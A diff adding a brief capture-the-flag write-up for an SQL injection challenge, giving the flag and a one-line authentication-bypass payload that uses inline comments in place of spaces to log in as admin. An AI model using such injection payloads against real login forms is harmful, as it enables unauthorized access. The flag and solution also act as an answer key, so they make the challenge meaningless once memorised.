@@ -1,0 +1,8 @@
+
+### challenge writeup 
+
+#FLag: CYBERHUB{50m3_ppl_H4te_SQLi_wbu_my_Fr!nD}
+
+it is an SQLi challenge , but player should send his injection with admin role .
+space is forbbiden .
+##quick solution: send the following in username input field -> `'OR/**/'1'='1'/**/and/**/role='admin'#` 
